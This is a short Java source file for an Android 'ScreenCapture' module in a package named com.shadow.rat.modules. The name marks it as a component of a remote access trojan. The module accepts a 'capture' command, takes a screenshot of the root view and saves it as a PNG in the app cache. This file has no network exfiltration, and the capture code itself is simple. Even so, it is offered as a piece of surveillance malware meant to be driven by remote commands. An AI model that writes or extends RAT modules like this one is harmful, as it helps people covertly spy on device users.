package com.shadow.rat.modules;

import android.content.Context;
import android.graphics.Bitmap;
import android.view.View;
import java.io.File;
import java.io.FileOutputStream;

public class ScreenCapture implements Module {

    private final Context context;
    private final View rootView;

    public ScreenCapture(Context context, View rootView) {
        this.context = context;
        this.rootView = rootView;
    }

    @Override
    public String execute(String command) {
        if (command.equalsIgnoreCase("capture")) {
            return captureScreen();
        }
        return "Unknown command for ScreenCapture. Available commands: capture";
    }

    private String captureScreen() {
        try {
            rootView.setDrawingCacheEnabled(true);
            Bitmap bitmap = Bitmap.createBitmap(rootView.getDrawingCache());
            rootView.setDrawingCacheEnabled(false);

            File outputFile = File.createTempFile("screenshot", ".png", context.getCacheDir());
            FileOutputStream fos = new FileOutputStream(outputFile);
            bitmap.compress(Bitmap.CompressFormat.PNG, 100, fos);
            fos.flush();
            fos.close();

            return "Screenshot saved to " + outputFile.getAbsolutePath();
        } catch (Exception e) {
            e.printStackTrace();
            return "Failed to capture screen: " + e.getMessage();
        }
    }
}
